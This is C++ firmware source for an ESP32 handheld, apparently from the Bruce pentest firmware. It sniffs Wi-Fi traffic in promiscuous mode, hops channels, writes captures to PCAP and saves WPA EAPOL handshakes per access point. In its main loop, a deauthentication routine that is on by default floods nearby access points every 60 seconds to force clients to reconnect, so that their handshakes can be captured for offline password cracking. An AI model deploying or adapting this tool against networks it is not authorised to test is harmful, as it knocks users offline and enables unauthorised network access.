/*
  ===========================================
       Copyright (c) 2017 Stefan Kremser
              github.com/spacehuhn
  ===========================================
*/
#include "sniffer.h"
/* include all necessary libraries */
#include "freertos/FreeRTOS.h"
#include "esp_wifi.h"
//#include "esp_wifi_internal.h"
#include "lwip/err.h"
#include "esp_system.h"
#include "esp_event.h"
//#include "esp_event_loop.h"
#include "nvs_flash.h"
#include "driver/gpio.h"
#include <set>

#include <Arduino.h>
#include <TimeLib.h>
#include "FS.h"
#include "core/display.h"
#include <globals.h>
#include "core/sd_functions.h"
#include "core/wifi_common.h"
#include "core/mykeyboard.h"
#if defined(ESP32)
	#include "FS.h"
	//#include "SD.h"
#else
	#include <SPI.h>
	#include <SdFat.h>
#endif
#include "modules/wifi/wifi_atks.h" // to use deauth frames and cmds

//===== SETTINGS =====//
#define CHANNEL 1
#define FILENAME "raw_"
#define SAVE_INTERVAL 10 //save new file every 30s
#define CHANNEL_HOPPING true //if true it will scan on all channels
#define MAX_CHANNEL 11 //(only necessary if channelHopping is true)
#define HOP_INTERVAL 214 //in ms (only necessary if channelHopping is true)


//===== Run-Time variables =====//
unsigned long lastTime = 0;
unsigned long lastChannelChange = 0;
uint8_t ch = CHANNEL;
bool fileOpen = false;
bool isLittleFS = true;
bool _only_HS=false; // option to only save handshakes and EAPOL pcaps
int num_EAPOL=0;
int num_HS=0;
uint32_t packet_counter = 0;

File _pcap_file;
std::set<BeaconList> registeredBeacons;
std::set<String> SavedHS; // Saves the MAC of beacon HS detected in the session
String filename = "/BrucePCAP/" + (String)FILENAME + ".pcap";

//===== Structures =====//
struct AP_info {
    uint8_t bssid[6];
    uint8_t essid[33];
    uint8_t essid_len;
    uint8_t channel;
    uint8_t encryption;
    int8_t power;
    uint32_t last_seen;
    bool beacon_logged;
};

struct WPAHandshake {
    uint8_t ap_mac[6];
    uint8_t client_mac[6];
    uint8_t messages[4][1024];
    uint8_t message_lengths[4];
    uint8_t received_messages;
    bool complete;
    uint32_t last_update;
};

//===== Global Variables =====//
std::set<AP_info> registeredAPs;
std::set<WPAHandshake> activeHandshakes;

//===== PCAP Analysis Functions =====//
struct PacketInfo {
    uint32_t timestamp;
    uint16_t type;
    uint16_t subtype;
    uint8_t source[6];
    uint8_t destination[6];
    uint8_t bssid[6];
    uint8_t ssid[33];
    uint8_t ssid_len;
    bool is_beacon;
    bool is_eapol;
    int8_t rssi;
};

void parsePCAPFile(const char* filename, FS &fs) {
    File file = fs.open(filename, FILE_READ);
    if (!file) {
        displayTextLine("Failed to open PCAP file");
        delay(2000);
        return;
    }

    // Skip PCAP header
    file.seek(24);

    std::set<std::string> uniqueAPs;
    std::set<std::string> uniqueClients;
    std::map<std::string, std::string> apSSIDs; // Map to store BSSID -> SSID
    std::set<std::string> apWithHandshake; // Set to store APs with complete handshakes
    int totalPackets = 0;
    int beaconFrames = 0;
    int eapolFrames = 0;
    int dataFrames = 0;
    int managementFrames = 0;

    while (file.available()) {
        pcaprec_hdr_t header;
        file.read((uint8_t*)&header, sizeof(pcaprec_hdr_t));

        if (header.incl_len > 0) {
            uint8_t* packet = new uint8_t[header.incl_len];
            file.read(packet, header.incl_len);

            // Parse packet
            if (header.incl_len >= 24) {  // Minimum size for 802.11 header
                uint8_t frameControl = packet[0];
                uint8_t frameType = (frameControl & 0x0C) >> 2;
                uint8_t frameSubType = (frameControl & 0xF0) >> 4;

                // Count frame types
                switch (frameType) {
                    case 0: managementFrames++; break;  // Management
                    case 1: break;  // Control
                    case 2: dataFrames++; break;  // Data
                }

                // Extract addresses
                uint8_t* addr1 = packet + 4;  // Destination
                uint8_t* addr2 = packet + 10; // Source
                uint8_t* addr3 = packet + 16; // BSSID

                // Store unique MACs
                char macStr[18];
                snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                    addr2[0], addr2[1], addr2[2], addr2[3], addr2[4], addr2[5]);
                uniqueClients.insert(macStr);

                snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                    addr3[0], addr3[1], addr3[2], addr3[3], addr3[4], addr3[5]);
                uniqueAPs.insert(macStr);

                // Extract SSID from beacon frames
                if (frameType == 0 && frameSubType == 0x08) {  // Beacon frame
                    beaconFrames++;
                    const uint8_t* ie = packet + 24;
                    size_t remaining = header.incl_len - 24;

                    while (remaining > 2) {
                        uint8_t ie_id = ie[0];
                        uint8_t ie_len = ie[1];

                        if (ie_id == 0x00) {  // SSID IE
                            char ssid[33] = {0};
                            size_t ssid_len = std::min(static_cast<size_t>(ie_len), static_cast<size_t>(32));
                            memcpy(ssid, ie + 2, ssid_len);
                            apSSIDs[macStr] = ssid;
                            break;
                        }

                        ie += 2 + ie_len;
                        remaining -= 2 + ie_len;
                    }
                }

                // Check for complete handshake
                if (isItEAPOL((wifi_promiscuous_pkt_t*)packet)) {
                    eapolFrames++;
                    const uint8_t* key_frame = packet + 24 + 8;
                    if (key_frame[0] == 0x02) {  // EAPOL Key frame
                        uint16_t key_info = (key_frame[2] << 8) | key_frame[3];
                        if ((key_info & 0x0080) && (key_info & 0x0100)) {  // Message 3 of 4
                            apWithHandshake.insert(macStr);
                        }
                    }
                }
            }

            delete[] packet;
            totalPackets++;
        }
    }

    file.close();

    // Display results
    drawMainBorderWithTitle("PCAP Analysis");
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

    int y = 40;
    tft.setCursor(10, y);
    tft.println("File: " + String(filename));
    y += 20;
    tft.setCursor(10, y);
    tft.println("Total Packets: " + String(totalPackets));
    y += 20;
    tft.setCursor(10, y);
    tft.println("Unique APs: " + String(uniqueAPs.size()));
    y += 20;
    tft.setCursor(10, y);
    tft.println("Unique Clients: " + String(uniqueClients.size()));
    y += 20;
    tft.setCursor(10, y);
    tft.println("Beacon Frames: " + String(beaconFrames));
    y += 20;
    tft.setCursor(10, y);
    tft.println("EAPOL Frames: " + String(eapolFrames));
    y += 20;
    tft.setCursor(10, y);
    tft.println("Data Frames: " + String(dataFrames));
    y += 20;
    tft.setCursor(10, y);
    tft.println("Management Frames: " + String(managementFrames));
    y += 20;

    // Display APs with their SSIDs
    tft.setCursor(10, y);
    tft.println("Access Points:");
    y += 20;
    for (const auto& ap : uniqueAPs) {
        if (y > tftHeight - 40) break; // Prevent overflow
        tft.setCursor(20, y);
        tft.print(ap.c_str());
        tft.print(": ");

        // Set color based on handshake status
        if (apWithHandshake.find(ap) != apWithHandshake.end()) {
            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
        } else {
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        }

        auto it = apSSIDs.find(ap);
        if (it != apSSIDs.end()) {
            tft.println(it->second.c_str());
        } else {
            tft.println("<Hidden>");
        }
        y += 20;
    }

    // Reset text color
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

    // Wait for user input
    while (!check(SelPress) && !check(EscPress)) {
        delay(10);
    }
    while (check(SelPress) || check(EscPress)) {
        delay(10);
    }
}

//===== FUNCTIONS =====//

// Thank you 7h30th3r0n3 for helping me solve this issue! and for sharing your EAPOL/Handshake sniffer
// please, give stars to his project: https://github.com/7h30th3r0n3/Evil-M5Core2/

//Handshake detection
bool isItEAPOL(const wifi_promiscuous_pkt_t* packet) {
  const uint8_t *payload = packet->payload;
  int len = packet->rx_ctrl.sig_len;

  // length check to ensure packet is large enough for EAPOL (minimum length)
  if (len < (24 + 8 + 4)) { // 24 bytes for the MAC header, 8 for LLC/SNAP, 4 for EAPOL minimum
    return false;
  }

  // check for LLC/SNAP header indicating EAPOL payload
  // LLC: AA-AA-03, SNAP: 00-00-00-88-8E for EAPOL
  if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 &&
      payload[27] == 0x00 && payload[28] == 0x00 && payload[29] == 0x00 &&
      payload[30] == 0x88 && payload[31] == 0x8E) {
    return true;
  }

  // handle QoS tagging which shifts the start of the LLC/SNAP headers by 2 bytes
  // check if the frame control field's subtype indicates a QoS data subtype (0x08)
  if ((payload[0] & 0x0F) == 0x08) {
    // Adjust for the QoS Control field and recheck for LLC/SNAP header
    if (payload[26] == 0xAA && payload[27] == 0xAA && payload[28] == 0x03 &&
        payload[29] == 0x00 && payload[30] == 0x00 && payload[31] == 0x00 &&
        payload[32] == 0x88 && payload[33] == 0x8E) {
      return true;
    }
  }

  return false;
}
// Définition de l'en-tête d'un paquet PCAP
typedef struct pcaprec_hdr_s {
  uint32_t ts_sec;         /* timestamp secondes */
  uint32_t ts_usec;        /* timestamp microsecondes */
  uint32_t incl_len;       /* nombre d'octets du paquet enregistrés dans le fichier */
  uint32_t orig_len;       /* longueur réelle du paquet */
} pcaprec_hdr_t;

void saveHandshake(const wifi_promiscuous_pkt_t* packet, bool beacon, FS &Fs) {
  // Construire le nom du fichier en utilisant les adresses MAC de l'AP et du client
  const uint8_t *addr1 = packet->payload + 4;  // Adresse du destinataire (Adresse 1)
  const uint8_t *addr2 = packet->payload + 10; // Adresse de l'expéditeur (Adresse 2)
  const uint8_t *bssid = packet->payload + 16; // Adresse BSSID (Adresse 3)
  const uint8_t *apAddr;

  if (memcmp(addr1, bssid, 6) == 0) {
    apAddr = addr1;
  } else {
    apAddr = addr2;
  }

  char nomFichier[50];
  sprintf(nomFichier, "/BrucePCAP/handshakes/HS_%02X%02X%02X%02X%02X%02X.pcap",
          apAddr[0], apAddr[1], apAddr[2], apAddr[3], apAddr[4], apAddr[5]);

  // Vérifier si le fichier existe déjà
  bool fichierExiste = false;

  // Check if the MAC Address was registered in the list
  if(SavedHS.find(String((char*)apAddr, 6)) != SavedHS.end()) {
    fichierExiste=true;
  }

  // Si probe est true et que le fichier n'existe pas, ignorer l'enregistrement
  if (beacon && !fichierExiste) {
    return;
  }

  // Ouvrir le fichier en mode ajout si existant sinon en mode écriture
  File fichierPcap = Fs.open(nomFichier, fichierExiste ? FILE_APPEND : FILE_WRITE); // if the file already exists in the new session, will overwrite it
  if (!fichierPcap) {
    Serial.println("Fail creating the EAPOL/Handshake PCAP file");
    return;
  }

  if (!beacon && !fichierExiste) {
    Serial.println("New EAPOL/Handshake PCAP file, writing header");
    SavedHS.insert(String((char*)apAddr, 6));
    num_HS++;
    writeHeader(fichierPcap);
  }
  if (beacon && fichierExiste) {
    BeaconList ThisBeacon;
    memcpy(ThisBeacon.MAC,(char*)apAddr, 6);
    ThisBeacon.channel=ch;
    if (registeredBeacons.find(ThisBeacon) != registeredBeacons.end()) {
      return; // Beacon déjà enregistré pour ce BSSID
    }
    registeredBeacons.insert(ThisBeacon); // Ajouter le BSSID à l'ensemble
  }

  // Écrire l'en-tête du paquet et le paquet lui-même dans le fichier
  pcaprec_hdr_t pcap_packet_header;
  pcap_packet_header.ts_sec = packet->rx_ctrl.timestamp / 1000000;
  pcap_packet_header.ts_usec = packet->rx_ctrl.timestamp % 1000000;
  pcap_packet_header.incl_len = packet->rx_ctrl.sig_len;
  pcap_packet_header.orig_len = packet->rx_ctrl.sig_len;
  fichierPcap.write((const byte*)&pcap_packet_header, sizeof(pcaprec_hdr_t));
  fichierPcap.write(packet->payload, packet->rx_ctrl.sig_len);
  fichierPcap.close();
}

void printAddress(const uint8_t* addr) {
  for (int i = 0; i < 6; i++) {
    Serial.printf("%02X", addr[i]);
    if (i < 5) Serial.print(":");
  }
  Serial.println();
}




/* write packet to file */
void newPacketSD(uint32_t ts_sec, uint32_t ts_usec, uint32_t len, uint8_t* buf,File pcap_file){
  if(pcap_file){

    uint32_t orig_len = len;
    uint32_t incl_len = len;
    //if(incl_len > snaplen) incl_len = snaplen; /* safty check that the packet isn't too big (I ran into problems here) */

    pcap_file.write((uint8_t*)&ts_sec, sizeof(ts_sec));
    pcap_file.write((uint8_t*)&ts_usec, sizeof(ts_usec));
    pcap_file.write((uint8_t*)&incl_len, sizeof(incl_len));
    pcap_file.write((uint8_t*)&orig_len, sizeof(orig_len));

    pcap_file.write(buf, incl_len);
  }
}

bool writeHeader(File file){
  uint32_t magic_number = 0xa1b2c3d4;
  uint16_t version_major = 2;
  uint16_t version_minor = 4;
  uint32_t thiszone = 0;
  uint32_t sigfigs = 0;
  uint32_t snaplen = 2500;
  uint32_t network = 105;

  if(file) {

    file.write((uint8_t*)&magic_number, sizeof(magic_number));
    file.write((uint8_t*)&version_major, sizeof(version_major));
    file.write((uint8_t*)&version_minor, sizeof(version_minor));
    file.write((uint8_t*)&thiszone, sizeof(thiszone));
    file.write((uint8_t*)&sigfigs, sizeof(sigfigs));
    file.write((uint8_t*)&snaplen, sizeof(snaplen));
    file.write((uint8_t*)&network, sizeof(network));

    return true;
  }
  return false;
}

// Extract SSID from beacon frame
bool extractSSID(const uint8_t* frame, size_t frame_len, AP_info* ap) {
    const uint8_t* ie = frame + 24;
    size_t remaining = frame_len - 24;

    while (remaining > 2) {
        uint8_t ie_id = ie[0];
        uint8_t ie_len = ie[1];

        if (ie_id == 0x00) {  // SSID IE
            size_t ssid_len = std::min(static_cast<size_t>(ie_len), static_cast<size_t>(32));
            memcpy(ap->essid, ie + 2, ssid_len);
            ap->essid[ssid_len] = '\0';
            ap->essid_len = ssid_len;
            return true;
        }

        ie += 2 + ie_len;
        remaining -= 2 + ie_len;
    }
    return false;
}

// Check if SSID is hidden
bool isHiddenSSID(const uint8_t* frame, size_t frame_len) {
    const uint8_t* ie = frame + 24;
    if (ie[0] == 0x00 && ie[1] == 0x00) {
        return true;
    }
    return false;
}

// Get handshake message number
uint8_t getHandshakeMessageNumber(const uint8_t* eapol_frame) {
    const uint8_t* key_frame = eapol_frame + 24 + 8;

    if (key_frame[0] != 0x02) return 0;

    uint16_t key_info = (key_frame[2] << 8) | key_frame[3];

    if (key_info & 0x0080) {
        if (key_info & 0x0100) {
            return 3;
        } else {
            return 1;
        }
    } else {
        if (key_info & 0x0100) {
            return 4;
        } else {
            return 2;
        }
    }
}

/* will be executed on every packet the ESP32 gets while beeing in promiscuous mode */
void sniffer(void *buf, wifi_promiscuous_pkt_type_t type){
  if(isLittleFS && !checkLittleFsSizeNM()) {
    returnToMenu = true;
    esp_wifi_set_promiscuous(false);
    return;
  }
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;

  if(fileOpen && !_only_HS){
    uint32_t timestamp = now(); // current timestamp
    uint32_t microseconds = (unsigned int)(micros() - millis() * 1000); // microseconds offset (0 - 999)

    uint32_t len = ctrl.sig_len;
    if(type == WIFI_PKT_MGMT) {
      len -= 4; // Need to remove last 4 bytes (for checksum) or packet gets malformed # https://github.com/espressif/esp-idf/issues/886
    }
    newPacketSD(timestamp, microseconds, len, pkt->payload, _pcap_file); // If it is to save everything, saves every packet
  }
  packet_counter++;

  const uint8_t *frame = pkt->payload;
  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
  const uint8_t frameType = (frameControl & 0x0C) >> 2;
  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  if(isItEAPOL(pkt)){
    //if(_only_HS) newPacketSD(timestamp, microseconds, len, pkt->payload, _pcap_file);
    num_EAPOL++;
    Serial.println("EAPOL detected.");
    const uint8_t *receiverAddr = frame + 4;
    const uint8_t *senderAddr = frame + 10;
    Serial.print("Address MAC destination: ");
    printAddress(receiverAddr);
    Serial.print("Address MAC expedition: ");
    printAddress(senderAddr);
    if(isLittleFS) saveHandshake(pkt, false, LittleFS);
    else saveHandshake(pkt, false, SD);
  }
  if (frameType == 0x00 && frameSubType == 0x08) {
    const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon

    // Convertir l'adresse MAC en chaîne de caractères pour la comparaison
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
            senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);


    pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 bytes
    // Enregistrer le paquet
    if(isLittleFS) saveHandshake(pkt, true, LittleFS);
    else saveHandshake(pkt, true, SD);
  }

  // Handle beacon frames
  if (frame[0] == 0x80) {
    AP_info ap;
    memset(&ap, 0, sizeof(AP_info));

    // Extract BSSID
    memcpy(ap.bssid, frame + 10, 6);
    ap.channel = ch;
    ap.power = pkt->rx_ctrl.rssi;
    ap.last_seen = millis();

    // Extract SSID
    if (extractSSID(frame, pkt->rx_ctrl.sig_len, &ap)) {
      if (!isHiddenSSID(frame, pkt->rx_ctrl.sig_len)) {
        Serial.printf("AP: %s (BSSID: %02X:%02X:%02X:%02X:%02X:%02X)\n",
          ap.essid,
          ap.bssid[0], ap.bssid[1], ap.bssid[2],
          ap.bssid[3], ap.bssid[4], ap.bssid[5]);
      }

      // Save beacon if needed
      if (!ap.beacon_logged) {
        if(isLittleFS) saveHandshake(pkt, true, LittleFS);
        else saveHandshake(pkt, true, SD);
        ap.beacon_logged = true;
      }
    }

    // Update or add AP to set
    auto it = std::find_if(registeredAPs.begin(), registeredAPs.end(),
      [&ap](const AP_info& x) { return memcmp(x.bssid, ap.bssid, 6) == 0; });

    if (it != registeredAPs.end()) {
      registeredAPs.erase(it);
    }
    registeredAPs.insert(ap);
  }
}

//esp_err_t event_handler(void *ctx, system_event_t *event){ return ESP_OK; }
void event_handler(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    if (event_base == WIFI_EVENT) {
        switch (event_id) {
            case WIFI_EVENT_STA_START:
                // Ação para quando a estação WiFi inicia
                break;
            // Outros casos...
        }
    } else if (event_base == IP_EVENT) {
        switch (event_id) {
            case IP_EVENT_STA_GOT_IP:
                // Ação para quando a estação WiFi obtém um endereço IP
                break;
            // Outros casos...
        }
    }
}

/* opens a new file */
int c = 0;

void openFile(FS &Fs){
  //searches for the next non-existent file name
  if (!Fs.exists("/BrucePCAP")) Fs.mkdir("/BrucePCAP");
  filename = "/BrucePCAP/" + (String)FILENAME + (String)c + ".pcap";
  while(Fs.open(filename)){
    filename = "/BrucePCAP/" + (String)FILENAME + (String)c + ".pcap";
    c++;
  }
  if (!Fs.exists("/BrucePCAP/handshakes")) Fs.mkdir("/BrucePCAP/handshakes");
  _pcap_file = Fs.open(filename, FILE_WRITE);
  if(_pcap_file) {
    fileOpen = writeHeader(_pcap_file);
    Serial.println("opened: "+filename);
  }
  else {
    fileOpen=false;
    Serial.println("Fail opening the file");
  }

}

//===== SETUP =====//
void sniffer_setup() {
  FS* Fs;
  int redraw = true;
  String FileSys="LittleFS";
  bool deauth=true;
  long deauth_tmp=0;
  drawMainBorderWithTitle("RAW SNIFFER");

  //closeSdCard();

  _only_HS=true; // default mode to start if it doesn't have SD Cadr
  if(setupSdCard()) {
    Fs = &SD; // if SD is present and mounted, start writing on SD Card
    FileSys="SD";
    isLittleFS=false;
    _only_HS=false; // When using SD Card, saves everything
  }
  else Fs = &LittleFS;        // if not, use the internal memory.

  openFile(*Fs);
  displayTextLine("Sniffing Started");
  tft.setTextSize(FP);
  tft.setCursor(80, 100);

  SavedHS.clear(); // Need to clear to restart HS count
  registeredBeacons.clear();
  /* setup wifi */
  nvs_flash_init();
  ESP_ERROR_CHECK(esp_netif_init());  //novo
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK( esp_wifi_init(&cfg) );
  ESP_ERROR_CHECK( esp_wifi_set_storage(WIFI_STORAGE_RAM) );

  wifi_config_t wifi_config;
  strcpy((char *)wifi_config.ap.ssid, "BruceSniffer");
  strcpy((char *)wifi_config.ap.password, "brucenet");
  wifi_config.ap.ssid_len = strlen("BruceSniffer");
  wifi_config.ap.channel = 1;                      // Channel
  wifi_config.ap.authmode = WIFI_AUTH_WPA2_PSK;    // auth mode
  wifi_config.ap.ssid_hidden = 1;                  // 1 to hidden SSID, 0 to visivle
  wifi_config.ap.max_connection = 2;               // Max connections
  wifi_config.ap.beacon_interval = 100;            // beacon interval in ms

  // Configura o modo AP
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
  ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
  ESP_ERROR_CHECK( esp_wifi_start() );
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(sniffer);
  wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
  esp_wifi_set_channel(ch,secondCh);

  Serial.println("Sniffer started!");
  delay(1000);

  if(isLittleFS && !checkLittleFsSize()) goto Exit;
  num_EAPOL=0;
  num_HS=0;
  packet_counter=0;
  deauth_tmp=millis();
  // Prepare deauth frame for each AP record
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
  for(;;) {
    if (returnToMenu) { // if it happpend, liffle FS is full;
      Serial.println("Not enough space on LittleFS");
      displayError("LittleFS Full");
      delay(5000);
      break;
    }
    unsigned long currentTime = millis();

    /* Channel Hopping */
    if(check(NextPress)){
      esp_wifi_set_promiscuous(false);
      esp_wifi_set_promiscuous_rx_cb(nullptr);
      ch++; //increase channel
      if(ch > MAX_CHANNEL) ch = 1;
      Serial.println(ch);
      wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
      esp_wifi_set_channel(ch,secondCh);
      redraw=true;
      delay(50);
      esp_wifi_set_promiscuous(true);
      esp_wifi_set_promiscuous_rx_cb(sniffer);
    }

    if(check(PrevPress)) {
      delay(200);
      #if !defined(HAS_KEYBOARD)
        long _tmp=millis();
        while(check(PrevPress)) tft.drawArc(tftWidth/2, tftHeight/2, 25,15,0,360*(millis()-_tmp)/700,getColorVariation(bruceConfig.priColor),bruceConfig.bgColor);
        if(millis()-_tmp>700) { // longpress detected to exit
          returnToMenu=true;
          _pcap_file.close();
          break;
        }
      #endif
      esp_wifi_set_promiscuous(false);
      esp_wifi_set_promiscuous_rx_cb(nullptr);
      ch--; //increase channel
      if(ch < 1) ch = 11;
      Serial.println(ch);
      wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
      esp_wifi_set_channel(ch,secondCh);
      redraw=true;
      delay(50);
      esp_wifi_set_promiscuous(true);
      esp_wifi_set_promiscuous_rx_cb(sniffer);
    }

    #if defined(HAS_KEYBOARD) || defined(T_EMBED) // T-Embed has a different btn for Escape, different from StickCs that uses Previous btn
      if(check(EscPress)) { // Apertar o botão power ou Esc
        returnToMenu=true;
        _pcap_file.close();
        break;
      }
    #endif

    if(check(SelPress) || redraw) { // Apertar o botão OK ou ENTER
      delay(200);
      if(!redraw) {
        options = {
          {"New File",     [=]() {
            if(_pcap_file) { // for the first run, only draws the screen, after that, changes files
              _pcap_file.flush(); //save file
              Serial.println("==================");
              Serial.println(filename + " saved!");
              Serial.println("==================");
              fileOpen = false; //update flag
              _pcap_file.close();
              c++; //add to filename
              openFile(*Fs); //open new file
            }
          }},
          {deauth?"Deauth->OFF":"Deauth->ON",      [&]()    { deauth=!deauth; }},
          {_only_HS?"All packets":"EAPOL/HS only", [=]()    { _only_HS=!_only_HS; }},
          {"Reset Counter", [=]()    { packet_counter=0; num_EAPOL=0; num_HS=0; }},
          {"Exit Sniffer", [=]()    { returnToMenu=true; }},
        };
        loopOptions(options);
      }
      if(returnToMenu) goto Exit;
      redraw = false;
      tft.drawPixel(0,0,0);
      drawMainBorderWithTitle("RAW SNIFFER"); // Clear Screen and redraw border
      tft.setTextSize(FP);
      tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
      padprintln("Saved file into " + FileSys);
      padprintln("File: " + filename);
      padprintln("Sniffer Mode: " + String(_only_HS?"Only EAPOL/HS":"All packets Sniff"));
      padprintln(deauth?"Deauth: ON":"Deauth: OFF");
      padprintln(String(BTN_ALIAS) + ": Options Menu");
      tft.drawRightString("Ch." + String(ch<10?"0":"") + String(ch) + "(Next)",tftWidth-10, tftHeight-18,1);
    }

    if(currentTime-lastTime>100) tft.drawPixel(0,0,0);

    if(fileOpen && currentTime - lastTime > 1000){
      _pcap_file.flush(); //save file
      lastTime = currentTime; //update time
      tft.drawString("EAPOL: " + String(num_EAPOL) + " HS: " + String(num_HS),10,tftHeight-18);
      tft.drawCentreString("Packets " + String(packet_counter),tftWidth/2, tftHeight-26,1);
    }

    if(deauth && (millis()-deauth_tmp)>60000) { // deauths once every 60 seconds
      if(registeredBeacons.size()>40) registeredBeacons.clear(); // Clear registered beacons to restart search and avoid restarts
      Serial.println("<<---- Starting Deauthentication Process ---->>");
      for(auto registeredBeacon:registeredBeacons) {
        if(registeredBeacon.channel==ch) {
          memcpy(&ap_record.bssid,registeredBeacon.MAC, 6);
          wsl_bypasser_send_raw_frame(&ap_record,registeredBeacon.channel); //writes the buffer with the information
          send_raw_frame(deauth_frame,26);
          delay(2);
        }
      }
      deauth_tmp=millis();
    }

    vTaskDelay(100/portTICK_PERIOD_MS);
  }
  Exit:
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  wifiDisconnect();
  delay(1);
}

void setHandshakeSniffer() {
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous_rx_cb(sniffer);
}
